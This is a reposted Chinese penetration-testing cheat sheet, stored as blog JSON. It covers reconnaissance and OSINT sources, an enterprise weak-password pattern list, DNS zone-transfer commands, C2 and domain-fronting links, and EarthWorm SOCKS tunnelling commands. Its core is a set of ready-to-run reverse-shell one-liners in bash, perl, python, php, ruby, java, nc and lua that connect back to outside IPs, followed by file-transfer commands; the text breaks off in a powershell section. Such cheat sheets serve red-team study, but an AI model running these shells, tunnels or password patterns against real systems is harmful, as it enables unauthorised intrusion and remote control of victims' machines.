{"title":"(转)知识点合集","uid":"7877f5fab13c4afbf71848ed5da71412","slug":"转-知识点合集","date":"2024-03-05T15:07:07.000Z","updated":"2024-03-11T03:21:52.691Z","comments":true,"path":"api/articles/转-知识点合集.json","keywords":null,"cover":[],"content":"<p> Author: <a href=\"https://twitter.com/Evi1cg\">Evi1cg</a><br> Blog: <a href=\"https://evi1cg.github.io/\">https://evi1cg.github.io</a></p>\n<h2 id=\"信息搜集\"><a href=\"#信息搜集\" class=\"headerlink\" title=\"信息搜集\"></a>信息搜集</h2><h3 id=\"开源情报信息收集（OSINT）\"><a href=\"#开源情报信息收集（OSINT）\" class=\"headerlink\" title=\"开源情报信息收集（OSINT）\"></a>开源情报信息收集（OSINT）</h3><h4 id=\"github\"><a href=\"#github\" class=\"headerlink\" title=\"github\"></a>github</h4><ul>\n<li>Github_Nuggests（自动爬取Github上文件敏感信息泄露） :<a href=\"https://github.com/az0ne/Github_Nuggests\">https://github.com/az0ne/Github_Nuggests</a></li>\n<li>GSIL（能够实现近实时（15分钟内）的发现Github上泄露的信息） :<a href=\"https://github.com/FeeiCN/GSIL\">https://github.com/FeeiCN/GSIL</a></li>\n<li>x-patrol(小米团队的):<a href=\"https://github.com/MiSecurity/x-patrol\">https://github.com/MiSecurity/x-patrol</a></li>\n</ul>\n<h4 id=\"whois查询-注册人反查-邮箱反查-相关资产\"><a href=\"#whois查询-注册人反查-邮箱反查-相关资产\" class=\"headerlink\" title=\"whois查询&#x2F;注册人反查&#x2F;邮箱反查&#x2F;相关资产\"></a>whois查询&#x2F;注册人反查&#x2F;邮箱反查&#x2F;相关资产</h4><ul>\n<li>站长之家:<a href=\"http://whois.chinaz.com/?DomainName=target.com&ws=\">http://whois.chinaz.com/?DomainName=target.com&amp;ws=</a></li>\n<li>爱站:<a href=\"https://whois.aizhan.com/target.com/\">https://whois.aizhan.com/target.com/</a></li>\n<li>微步在线:<a href=\"https://x.threatbook.cn/\">https://x.threatbook.cn/</a></li>\n<li>IP反查:<a href=\"https://dns.aizhan.com/\">https://dns.aizhan.com/</a></li>\n<li>天眼查:<a href=\"https://www.tianyancha.com/\">https://www.tianyancha.com/</a></li>\n<li>虎妈查:<a href=\"http://www.whomx.com/\">http://www.whomx.com/</a></li>\n<li>历史漏洞查询 :<ul>\n<li>在线查询:<a href=\"http://wy.zone.ci/\">http://wy.zone.ci/</a></li>\n<li>自搭建:<a href=\"https://github.com/hanc00l/wooyun_public/\">https://github.com/hanc00l/wooyun_public/</a></li>\n</ul>\n</li>\n</ul>\n<h4 id=\"google-hacking\"><a href=\"#google-hacking\" class=\"headerlink\" title=\"google hacking\"></a>google hacking</h4><h3 id=\"创建企业密码字典\"><a href=\"#创建企业密码字典\" class=\"headerlink\" title=\"创建企业密码字典\"></a>创建企业密码字典</h3><h4 id=\"字典列表\"><a href=\"#字典列表\" class=\"headerlink\" title=\"字典列表\"></a>字典列表</h4><ul>\n<li>passwordlist:<a href=\"https://github.com/lavalamp-/password-lists\">https://github.com/lavalamp-/password-lists</a></li>\n<li>猪猪侠字典:<a href=\"https://pan.baidu.com/s/1dFJyedz\">https://pan.baidu.com/s/1dFJyedz</a><br><a href=\"https://github.com/rootphantomer/Blasting_dictionary\">Blasting_dictionary</a>（分享和收集各种字典，包括弱口令，常用密码，目录爆破。数据库爆破，编辑器爆破，后台爆破等） </li>\n<li>针对特定的厂商，重点构造厂商相关域名的字典</li>\n</ul>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">[&#39;%pwd%123&#39;,&#39;%user%123&#39;,&#39;%user%521&#39;,&#39;%user%2017&#39;,&#39;%pwd%321&#39;,&#39;%pwd%521&#39;,&#39;%user%321&#39;,&#39;%pwd%123!&#39;,&#39;%pwd%123!@#&#39;,&#39;%pwd%1234&#39;,&#39;%user%2016&#39;,&#39;%user%123$%^&#39;,&#39;%user%123!@#&#39;,&#39;%pwd%2016&#39;,&#39;%pwd%2017&#39;,&#39;%pwd%1!&#39;,&#39;%pwd%2@&#39;,&#39;%pwd%3#&#39;,&#39;%pwd%123#@!&#39;,&#39;%pwd%12345&#39;,&#39;%pwd%123$%^&#39;,&#39;%pwd%!@#456&#39;,&#39;%pwd%123qwe&#39;,&#39;%pwd%qwe123&#39;,&#39;%pwd%qwe&#39;,&#39;%pwd%123456&#39;,&#39;%user%123#@!&#39;,&#39;%user%!@#456&#39;,&#39;%user%1234&#39;,&#39;%user%12345&#39;,&#39;%user%123456&#39;,&#39;%user%123!&#39;]</span></span></code></pre></div><h4 id=\"密码生成\"><a href=\"#密码生成\" class=\"headerlink\" title=\"密码生成\"></a>密码生成</h4><ul>\n<li>GenpAss（中国特色的弱口令生成器: <a href=\"https://github.com/RicterZ/genpAss/\">https://github.com/RicterZ/genpAss/</a></li>\n<li>passmaker（可以自定义规则的密码字典生成器） ：<a href=\"https://github.com/bit4woo/passmaker\">https://github.com/bit4woo/passmaker</a></li>\n<li>pydictor（强大的密码生成器） ：<a href=\"https://github.com/LandGrey/pydictor\">https://github.com/LandGrey/pydictor</a></li>\n</ul>\n<h4 id=\"邮箱列表获取\"><a href=\"#邮箱列表获取\" class=\"headerlink\" title=\"邮箱列表获取\"></a>邮箱列表获取</h4><ul>\n<li>theHarvester ：<a href=\"https://github.com/laramies/theHarvester\">https://github.com/laramies/theHarvester</a></li>\n<li>获取一个邮箱以后导出通讯录 </li>\n<li>LinkedInt :<a href=\"https://github.com/mdsecactivebreach/LinkedInt\">https://github.com/mdsecactivebreach/LinkedInt</a></li>\n<li>Mailget：<a href=\"https://github.com/Ridter/Mailget\">https://github.com/Ridter/Mailget</a></li>\n</ul>\n<h4 id=\"泄露密码查询\"><a href=\"#泄露密码查询\" class=\"headerlink\" title=\"泄露密码查询\"></a>泄露密码查询</h4><ul>\n<li>ghostproject: <a href=\"https://ghostproject.fr/\">https://ghostproject.fr/</a></li>\n<li>pwndb: <a href=\"https://pwndb2am4tzkvold.onion.to/\">https://pwndb2am4tzkvold.onion.to/</a></li>\n</ul>\n<h4 id=\"对企业外部相关信息进行搜集\"><a href=\"#对企业外部相关信息进行搜集\" class=\"headerlink\" title=\"对企业外部相关信息进行搜集\"></a>对企业外部相关信息进行搜集</h4><h5 id=\"子域名获取\"><a href=\"#子域名获取\" class=\"headerlink\" title=\"子域名获取\"></a>子域名获取</h5><ul>\n<li>Layer子域名挖掘机4.2纪念版 </li>\n<li>subDomainsBrute ：<a href=\"https://github.com/lijiejie/subDomainsBrute\">https://github.com/lijiejie/subDomainsBrute</a></li>\n<li>wydomain ：<a href=\"https://github.com/ring04h/wydomain\">https://github.com/ring04h/wydomain</a></li>\n<li>Sublist3r ：<a href=\"https://github.com/aboul3la/Sublist3r\">https://github.com/aboul3la/Sublist3r</a></li>\n<li>企查查：<a href=\"https://www.qcc.com/\">https://www.qcc.com/</a></li>\n<li>天眼查：<a href=\"https://www.tianyancha.com/\">https://www.tianyancha.com/</a></li>\n<li>site:target.com:<a href=\"https://www.google.com/\">https://www.google.com</a></li>\n<li>Github代码仓库 </li>\n<li>抓包分析请求返回值(跳转&#x2F;文件上传&#x2F;app&#x2F;api接口等) </li>\n<li>站长帮手links等在线查询网站 </li>\n<li>域传送漏洞</li>\n</ul>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>Linux</p></blockquote>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">dig @ns.example.com example=.com AXFR </span></span></code></pre></div><p>Windows</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">nslookup -type=ns xxx.yyy.cn #查询解析某域名的DNS服务器</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">nslookup #进入nslookup交互模式</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">server dns.domian.com #指定dns服务器</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">ls xxx.yyy.cn #列出域信息</span></span></code></pre></div><ul>\n<li>GetDomainsBySSL.py :<a href=\"https://note.youdao.com/ynoteshare1/index.html?id=247d97fc1d98b122ef9804906356d47a&type=note#/\">https://note.youdao.com/ynoteshare1/index.html?id=247d97fc1d98b122ef9804906356d47a&amp;type=note#/</a></li>\n<li>censys.io证书 :<a href=\"https://censys.io/certificates?q=target.com\">https://censys.io/certificates?q=target.com</a></li>\n<li>crt.sh证书查询:<a href=\"https://crt.sh/?q=%25.target.com\">https://crt.sh/?q=%25.target.com</a></li>\n<li>shadon :<a href=\"https://www.shodan.io/\">https://www.shodan.io/</a></li>\n<li>zoomeye :<a href=\"https://www.zoomeye.org/\">https://www.zoomeye.org/</a></li>\n<li>fofa :<a href=\"https://fofa.so/\">https://fofa.so/</a></li>\n<li>censys：<a href=\"https://censys.io/\">https://censys.io/</a></li>\n<li>dnsdb.io :<a href=\"https://dnsdb.io/zh-cn/search?q=target.com\">https://dnsdb.io/zh-cn/search?q=target.com</a></li>\n<li>api.hackertarget.com :<a href=\"http://api.hackertarget.com/reversedns/?q=target.com\">http://api.hackertarget.com/reversedns/?q=target.com</a></li>\n<li>community.riskiq.com :<a href=\"https://community.riskiq.com/Search/target.com\">https://community.riskiq.com/Search/target.com</a></li>\n<li>subdomain3 :<a href=\"https://github.com/yanxiu0614/subdomain3\">https://github.com/yanxiu0614/subdomain3</a></li>\n<li>FuzzDomain :<a href=\"https://github.com/Chora10/FuzzDomain\">https://github.com/Chora10/FuzzDomain</a></li>\n<li>dnsdumpster.com :<a href=\"https://dnsdumpster.com/\">https://dnsdumpster.com/</a></li>\n<li>phpinfo.me :<a href=\"https://phpinfo.me/domain/\">https://phpinfo.me/domain/</a></li>\n<li>dns开放数据接口 :<a href=\"https://dns.bufferover.run/dns?q=baidu.com\">https://dns.bufferover.run/dns?q=baidu.com</a></li>\n</ul>\n<h2 id=\"进入内网\"><a href=\"#进入内网\" class=\"headerlink\" title=\"进入内网\"></a>进入内网</h2><h3 id=\"基于企业弱账号漏洞\"><a href=\"#基于企业弱账号漏洞\" class=\"headerlink\" title=\"基于企业弱账号漏洞\"></a>基于企业弱账号漏洞</h3><ul>\n<li>VPN（通过邮箱，密码爆破，社工等途径获取VPN） </li>\n<li>企业相关运维系统（zabbix等）</li>\n</ul>\n<h3 id=\"基于系统漏洞进入\"><a href=\"#基于系统漏洞进入\" class=\"headerlink\" title=\"基于系统漏洞进入\"></a>基于系统漏洞进入</h3><ul>\n<li>Metasploit(漏洞利用框架):<a href=\"https://github.com/rapid7/metasploit-framework\">https://github.com/rapid7/metasploit-framework</a> </li>\n<li>漏洞利用脚本</li>\n</ul>\n<h3 id=\"网站应用程序渗透\"><a href=\"#网站应用程序渗透\" class=\"headerlink\" title=\"网站应用程序渗透\"></a>网站应用程序渗透</h3><ul>\n<li>SQL注入 </li>\n<li>跨站脚本（XSS） </li>\n<li>跨站请求伪造（CSRF） </li>\n<li>SSRF（<a href=\"https://github.com/bcoles/ssrf_proxy\">ssrf_proxy</a>） </li>\n<li>功能&#x2F;业务逻辑漏洞 </li>\n<li>其他漏洞等 </li>\n<li>CMS-内容管理系统漏洞 </li>\n<li>企业自建代理</li>\n</ul>\n<h3 id=\"无线Wi-Fi接入\"><a href=\"#无线Wi-Fi接入\" class=\"headerlink\" title=\"无线Wi-Fi接入\"></a>无线Wi-Fi接入</h3><h2 id=\"隐匿攻击\"><a href=\"#隐匿攻击\" class=\"headerlink\" title=\"隐匿攻击\"></a>隐匿攻击</h2><h3 id=\"Command-and-Control\"><a href=\"#Command-and-Control\" class=\"headerlink\" title=\"Command and Control\"></a>Command and Control</h3><ul>\n<li>ICMP :<a href=\"https://pentestlab.blog/2017/07/28/command-and-control-icmp/\">https://pentestlab.blog/2017/07/28/command-and-control-icmp/</a></li>\n<li>DNS :<a href=\"https://pentestlab.blog/2017/09/06/command-and-control-dns/\">https://pentestlab.blog/2017/09/06/command-and-control-dns/</a></li>\n<li>DropBox :<a href=\"https://pentestlab.blog/2017/08/29/command-and-control-dropbox/\">https://pentestlab.blog/2017/08/29/command-and-control-dropbox/</a></li>\n<li>Gmail :<a href=\"https://pentestlab.blog/2017/08/03/command-and-control-gmail/\">https://pentestlab.blog/2017/08/03/command-and-control-gmail/</a></li>\n<li>Telegram :<a href=\"http://drops.xmd5.com/static/drops/tips-16142.html\">http://drops.xmd5.com/static/drops/tips-16142.html</a></li>\n<li>Twitter :<a href=\"https://pentestlab.blog/2017/09/26/command-and-control-twitter/\">https://pentestlab.blog/2017/09/26/command-and-control-twitter/</a></li>\n<li>Website Keyword :<a href=\"https://pentestlab.blog/2017/09/14/command-and-control-website-keyword/\">https://pentestlab.blog/2017/09/14/command-and-control-website-keyword/</a></li>\n<li>PowerShell :<a href=\"https://pentestlab.blog/2017/08/19/command-and-control-powershell/\">https://pentestlab.blog/2017/08/19/command-and-control-powershell/</a></li>\n<li>Windows COM :<a href=\"https://pentestlab.blog/2017/09/01/command-and-control-windows-com/\">https://pentestlab.blog/2017/09/01/command-and-control-windows-com/</a></li>\n<li>WebDAV :<a href=\"https://pentestlab.blog/2017/09/12/command-and-control-webdav/\">https://pentestlab.blog/2017/09/12/command-and-control-webdav/</a></li>\n<li>Office 365 :<a href=\"https://www.anquanke.com/post/id/86974\">https://www.anquanke.com/post/id/86974</a></li>\n<li>HTTPS :<a href=\"https://pentestlab.blog/2017/10/04/command-and-control-https/\">https://pentestlab.blog/2017/10/04/command-and-control-https/</a></li>\n<li>Kernel :<a href=\"https://pentestlab.blog/2017/10/02/command-and-control-kernel/\">https://pentestlab.blog/2017/10/02/command-and-control-kernel/</a></li>\n<li>Website :<a href=\"https://pentestlab.blog/2017/11/14/command-and-control-website/\">https://pentestlab.blog/2017/11/14/command-and-control-website/</a></li>\n<li>WMI :<a href=\"https://pentestlab.blog/2017/11/20/command-and-control-wmi/\">https://pentestlab.blog/2017/11/20/command-and-control-wmi/</a></li>\n<li>WebSocket :<a href=\"https://pentestlab.blog/2017/12/06/command-and-control-websocket/\">https://pentestlab.blog/2017/12/06/command-and-control-websocket/</a></li>\n<li>Images :<a href=\"https://pentestlab.blog/2018/01/02/command-and-control-images/\">https://pentestlab.blog/2018/01/02/command-and-control-images/</a></li>\n<li>Web Interface :<a href=\"https://pentestlab.blog/2018/01/03/command-and-control-web-interface/\">https://pentestlab.blog/2018/01/03/command-and-control-web-interface/</a></li>\n<li>JavaScript :<a href=\"https://pentestlab.blog/2018/01/08/command-and-control-javascript/\">https://pentestlab.blog/2018/01/08/command-and-control-javascript/</a></li>\n<li>…</li>\n</ul>\n<h3 id=\"Fronting\"><a href=\"#Fronting\" class=\"headerlink\" title=\"Fronting\"></a>Fronting</h3><ul>\n<li><a href=\"https://evi1cg.me/archives/Domain_Fronting.html\">Domain Fronting </a></li>\n<li><a href=\"https://evi1cg.me/archives/Tor_Fronting.html\">Tor_Fronting.</a></li>\n</ul>\n<h3 id=\"代理\"><a href=\"#代理\" class=\"headerlink\" title=\"代理\"></a>代理</h3><ul>\n<li>VPN </li>\n<li>shadowsockts :<a href=\"https://github.com/shadowsocks\">https://github.com/shadowsocks</a></li>\n<li>HTTP :<a href=\"http://cn-proxy.com/\">http://cn-proxy.com/</a></li>\n<li>Tor</li>\n</ul>\n<h2 id=\"内网跨边界应用\"><a href=\"#内网跨边界应用\" class=\"headerlink\" title=\"内网跨边界应用\"></a>内网跨边界应用</h2><h3 id=\"内网跨边界转发\"><a href=\"#内网跨边界转发\" class=\"headerlink\" title=\"内网跨边界转发\"></a>内网跨边界转发</h3><ul>\n<li><a href=\"https://blog.csdn.net/l_f0rm4t3d/article/details/24004555\">NC端口转发</a> </li>\n<li><a href=\"http://blog.chinaunix.net/uid-53401-id-4407931.html\">LCX端口转发 </a></li>\n<li><a href=\"https://github.com/cnlh/nps\">nps</a> -&gt; 个人用觉得比较稳定 ～</li>\n<li><a href=\"https://github.com/fatedier/frp\">frp</a></li>\n<li>代理脚本 <ol>\n<li><a href=\"https://github.com/SECFORCE/Tunna\">Tunna </a></li>\n<li><a href=\"https://github.com/sensepost/reDuh\">Reduh </a></li>\n</ol>\n</li>\n<li>…</li>\n</ul>\n<h3 id=\"内网跨边界代理穿透\"><a href=\"#内网跨边界代理穿透\" class=\"headerlink\" title=\"内网跨边界代理穿透\"></a>内网跨边界代理穿透</h3><h4 id=\"EW\"><a href=\"#EW\" class=\"headerlink\" title=\"EW\"></a><a href=\"https://rootkiter.com/EarthWorm/\">EW</a></h4><p>正向 SOCKS v5 服务器:</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">./ew -s ssocksd -l 1080</span></span></code></pre></div><p> 反弹 SOCKS v5 服务器:<br>a) 先在一台具有公网 ip 的主机A上运行以下命令：</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">$ ./ew -s rcsocks -l 1080 -e 8888 </span></span>\n<span class=\"line\"><span style=\"color: #babed8\"></span></span></code></pre></div><p>b) 在目标主机B上启动 SOCKS v5 服务 并反弹到公网主机的 8888端口</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">$ ./ew -s rssocks -d 1.1.1.1 -e 8888 </span></span></code></pre></div><p>多级级联</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">$ ./ew -s lcx_listen -l 1080 -e 8888</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">$ ./ew -s lcx_tran -l 1080 -f 2.2.2.3 -g 9999</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">$ ./ew -s lcx_slave -d 1.1.1.1 -e 8888 -f 2.2.2.3 -g 9999</span></span></code></pre></div><p>lcx_tran 的用法</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">$ ./ew -s ssocksd -l 9999</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">$ ./ew -s lcx_tran -l 1080 -f 127.0.0.1 -g 9999</span></span></code></pre></div><p>lcx_listen、lcx_slave 的用法</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">$ ./ew -s lcx_listen -l 1080 -e 8888</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">$ ./ew -s ssocksd -l 9999</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">$ ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999</span></span></code></pre></div><p>“三级级联”的本地SOCKS测试用例以供参考</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">$ ./ew -s rcsocks -l 1080 -e 8888</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">$ ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">$ ./ew -s lcx_listen -l 9999 -e 7777</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">$ ./ew -s rssocks -d 127.0.0.1 -e 7777</span></span></code></pre></div><h4 id=\"Termite\"><a href=\"#Termite\" class=\"headerlink\" title=\"Termite\"></a><a href=\"https://rootkiter.com/Termite/\">Termite</a></h4><p>使用说明:<a href=\"https://rootkiter.com/Termite/README.txt\">https://rootkiter.com/Termite/README.txt</a> </p>\n<h4 id=\"代理脚本\"><a href=\"#代理脚本\" class=\"headerlink\" title=\"代理脚本\"></a>代理脚本</h4><p>reGeorg :<a href=\"https://github.com/sensepost/reGeorg\">https://github.com/sensepost/reGeorg</a><br>Neo-reGeorg:<a href=\"https://github.com/L-codes/Neo-reGeorg\">https://github.com/L-codes/Neo-reGeorg</a><br>pystinger(毒刺):<a href=\"https://github.com/FunnyWolf/pystinger\">https://github.com/FunnyWolf/pystinger</a><br>ABPTTS:<a href=\"https://github.com/nccgroup/ABPTTS\">https://github.com/nccgroup/ABPTTS</a></p>\n<h3 id=\"shell反弹\"><a href=\"#shell反弹\" class=\"headerlink\" title=\"shell反弹\"></a>shell反弹</h3><p>bash  </p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</span></span></code></pre></div><p>perl </p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">perl -e &#39;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#39;</span></span></code></pre></div><p>python </p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</span></span></code></pre></div><p>php </p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">php -r &#39;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span></span></code></pre></div><p>ruby </p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">ruby -rsocket -e&#39;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</span></span></code></pre></div><p>java </p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">r = Runtime.getRuntime()</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \\$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">p.waitFor()</span></span></code></pre></div><p>nc </p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">#使用-e </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">nc -e /bin/sh 223.8.200.234 1234 </span></span></code></pre></div><div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">#不使用-e</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">mknod /tmp/backpipe p</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">/bin/sh 0/tmp/backpipe | nc attackerip listenport 1&gt;/tmp/backpipe</span></span></code></pre></div><p>lua </p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">lua -e &quot;require(&#39;socket&#39;);require(&#39;os&#39;);t=socket.tcp();t:connect(&#39;202.103.243.122&#39;,&#39;1234&#39;);os.execute(&#39;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot;</span></span></code></pre></div><h3 id=\"内网文件的传输和下载\"><a href=\"#内网文件的传输和下载\" class=\"headerlink\" title=\"内网文件的传输和下载\"></a>内网文件的传输和下载</h3><p>wput </p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">wput dir_name ftp://linuxpig:123456@host.com/</span></span></code></pre></div><p>wget </p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">wget http://site.com/1.rar -O 1.rar</span></span></code></pre></div><p>ariac2（需安装） </p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">aria2c -o owncloud.zip https://download.owncloud.org/community/owncloud-9.0.0.tar.bz2</span></span></code></pre></div><p>powershell</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span 